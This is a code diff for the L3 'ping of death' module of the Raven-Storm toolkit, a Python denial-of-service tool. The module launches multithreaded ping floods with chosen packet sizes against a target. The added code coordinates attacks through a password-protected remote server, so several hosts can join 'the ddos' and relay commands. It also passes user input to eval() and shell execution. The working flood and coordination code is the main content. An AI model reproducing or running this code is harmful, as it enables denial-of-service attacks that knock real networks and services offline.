@@ -1,28 +1,41 @@
-from CLIF_Framework.framework import event
-from CLIF_Framework.framework import tools
-from os import system
+# 2020
+# The Raven-Storm Toolkit was programmed and developed by Taguar258.
+# The Raven-Storm Toolkit is published under the MIT Licence.
+# The Raven-Storm Toolkit is based on the CLIF-Framework.
+# The CLIF-Framework is programmed and developed by Taguar258.
+# The CLIF-Framework is published under the MIT Licence.
+
+import socket
+from os import getcwd, path, system
+from threading import Thread
+from time import sleep
+
+import requests
+from CLIF_Framework.framework import event, tools  # noqa: I900
+
 try:
 	from os import geteuid
+
 	geteuid_exists = True
 except ImportError:
 	geteuid_exists = False
-from time import sleep
-import socket
+
 try:
 	import nmap
 except Exception as e:
 	print("Please install following module:", e)
 	quit()
+
 event = event()
 tools = tools()
 
 
 class Main:
-	def __init__(selfie, console):
+	def __init__(selfie, console):  # noqa: N805
 		global self
 		global var
 		self = selfie
-		var = console
+		var = console  # noqa: VNE002
 
 		self._add_commands()
 
@@ -42,6 +55,8 @@ class Main:
 		var.sleep = 0
 		var.interval = 0
 		var.auto_stop = 0
+
+		var.l3_debug = False
 
 	def _add_commands(self):
 		event.commands(self.exit_console, ["exit", "quit", "e", "q"])
@@ -80,19 +95,20 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			input("[Press Enter]")
 			print("")
 			var.stop()
+			return
 
 	def exit_console(self):
-		print("\033[1;32;0mHave a nice day.")
+		print("Have a nice day.")
 		quit()
 
 	def run_shell(self, command):
 		print("")
-		system(tools.arg("Enter shell command: \033[1;32;0m", ". ", command))
+		system(tools.arg("Enter shell command: ", ". ", command))
 		print("")
 
 	def debug(self, command):
 		print("")
-		eval(tools.arg("Enter debug command: \033[1;32;0m", "$ ", command))
+		eval(tools.arg("Enter debug command: ", "$ ", command))
 		print("")
 
 	@event.command
@@ -133,10 +149,53 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		print("The command you entered does not exist.")
 		print("")
 
+	def check_session(self):
+		if var.session[1][0] and len(var.session[1][1]) >= 1:
+			if len(var.session[1][1][0]) >= 1:
+				run_following = [var.session[1][1][0][0], var.session[1][1][0][0]]
+				var.session[1][1][0] = var.session[1][1][0][1:]
+			else:
+				var.session[1][1] = var.session[1][1][1:]
+				run_following = [var.session[1][1][0][0], var.session[1][1][0][0]]
+				var.session[1][1][0] = var.session[1][1][0][1:]
+			var.run_command = run_following
+
+	@event.event
+	def on_input():
+		self.check_session()
+		if var.server[0] and not var.server[1]:
+			while True:
+				data = requests.post((var.server[2] + ("get/com%s" % var.server[4])), data={"password": var.server[3]}).text
+				if data != "500":
+					var.server[4] = var.server[4] + 1
+					var.run_command = [data, data]
+					print(var.ps1 + "\r")
+					break
+				else:
+					sleep(1)
+
 	@event.event
 	def on_interrupt():
 		print("")
 		var.stop()
+
+	@event.event
+	def on_command(command):
+		if var.session[0][0]:
+			var.session[0][1].write(command + "\n")
+		if var.server[0] and var.server[1]:
+			status = requests.post((var.server[2] + "set/com"), data={"password": var.server[3], "data": command}).text
+			if status != "200":
+				print("")
+				print("An error occured, while sending commands to the server.")
+				print("")
+
+	@event.command
+	def debug():
+		var.l3_debug = True
+		print("")
+		print("Debugging mode enabled.")
+		print("")
 
 	def show_values(self):
 		print("")
@@ -151,7 +210,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def help(self):
 		event.help_title("\x1b[1;39mPoD Help:\x1b[0;39m")
 		tools.help("|-- ", " :: ", event)
-		print("\033[1;32;0m")
+		print("")
 
 	@event.command
 	def targets(command):
@@ -245,7 +304,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		print(" ")
 
 	def pod(self, size, target, threads, threadssleep, podinterval, podautodl):
-		print(("Starting attack...\nC_B[Hit CTRL + Z to stop the attack]C_W").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
+		print(("Starting attack...\nC_B[Hit ENTER or CTRL + C to stop the attack]\nC_W").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
 		targets = []
 		feat = ""
 		if podinterval != 0:
@@ -257,46 +316,118 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		else:
 			targets = [target]
 		del(target)
+		if var.l3_debug:
+			output_to_dev_null = ""
+		else:
+			output_to_dev_null = "> /dev/null "
 		for target in targets:
 			if geteuid() == 0:
-				print(("Starting thread C_BwithC_W sudo privileges.").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
-				killcom = ('sudo ping -f -q -s %s %s %s  > /dev/null' % (size, feat, target)).replace("  ", " ")
+				print(("Running thread C_BwithC_W sudo privileges.").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
+				killcom = ('sudo ping -f -q -s %s %s %s %s& ' % (size, feat, target, output_to_dev_null)).replace("  ", " ")
 			else:
-				print(("Starting thread C_BwithoutC_W sudo privileges.").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
-				killcom = ("ping -q -s %s %s %s > /dev/null" % (size, feat, target)).replace("  ", " ")
+				print(("Running thread C_BwithoutC_W sudo privileges.").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
+				killcom = ("ping -q -s %s %s %s %s& " % (size, feat, target, output_to_dev_null)).replace("  ", " ")
 			try:
 				for i in range(int(threads)):
 					system(killcom)
 					sleep(float(threadssleep))
 			except KeyboardInterrupt:
-				system("killall ping")
+				system("killall -SIGINT ping")
 				print("Attack abort.")
-				quit()
 			except Exception as pingerror:
+				var.command_log.append("ERROR: %s" % pingerror)
 				print("An error was caught while executing.", pingerror)
-				system("killall ping")
+				system("killall -SIGINT ping")
 				print("Attack abort.")
-				quit()
 			try:
 				input("")
-				system("killall ping")
+				system("killall -SIGINT ping")
 				print("Attack abort.")
-				quit()
 			except Exception:
-				system("killall ping")
+				system("killall -SIGINT ping")
 				print("Attack abort.")
-				quit()
 			print("Attack abort.")
 
 	@event.command
 	def run():
-		if not tools.question("\nDo you agree to not use this tool for illegal purpose?"):
+		def execute():
+			self.pod(var.size, var.target, var.threads, var.sleep, var.interval, var.auto_stop)
+
+			def reset_attack():
+				print("Stopping threads...")
+				system("killall ping")
+				if var.l3_debug:
+					print("Saving debugging log...")
+					output_to = path.join(getcwd(), "l3_debug_log.txt")
+
+					write_method = "a"
+					if path.isfile(output_to):
+						write_method = "a"
+					else:
+						write_method = "w"
+
+					output_file = open(output_to, write_method)
+					if write_method == "a":
+						output_file.write("------------- New Log -------------")
+					output_file.write(str(var.command_log))
+					output_file.close()
+				print("Done.")
+				quit()
+
+			def check_stopped_execution():
+				while True:
+					data = requests.post((var.server[2] + "get/agreed"), data={"password": var.server[3]}).text
+					if data != "True":
+						reset_attack()
+						break
+					else:
+						sleep(1)
+			try:
+				if var.server[0] and var.server[0]:
+					rec_t = Thread(target=check_stopped_execution)
+					rec_t.start()
+				input("\r")
+			except KeyboardInterrupt:
+				pass
+
+			if var.server[0] and var.server[1]:
+				status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
+				if status != "200":
+					print("An error occured, while sending data to the server.")
+
+			reset_attack()
+
+		if var.server[0] and not var.server[1]:
+			while True:
+				data = requests.post((var.server[2] + "get/agreed"), data={"password": var.server[3]}).text
+				if data == "True":
+					execute()
+					break
+				else:
+					sleep(1)
+		elif not tools.question("\nDo you agree to not use this tool for illegal purpose?"):
 			print("Agreement not accepted.")
 			quit()
 		else:
-			self.pod(var.size, var.target, var.threads, var.sleep, var.interval, var.auto_stop)
+			if var.server[0] and var.server[1]:
+				if tools.question("\nWould you like to use the host as part of the ddos?"):
+					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
+					if status != "200":
+						print("An error occured, while sending data to the server.")
+					execute()
+				else:
+					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
+					if status != "200":
+						print("An error occured, while sending data to the server.")
+					try:
+						print("[Press Enter to stop the attack.]")
+					except KeyboardInterrupt:
+						pass
+					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
+					if status != "200":
+						print("An error occured, while sending data to the server.")
 
 
 def setup(console):
-	console.ps1 = "\033[1;32;0mL3> "
+	console.ps1 = "L3> "
 	console.add(Main(console), event)
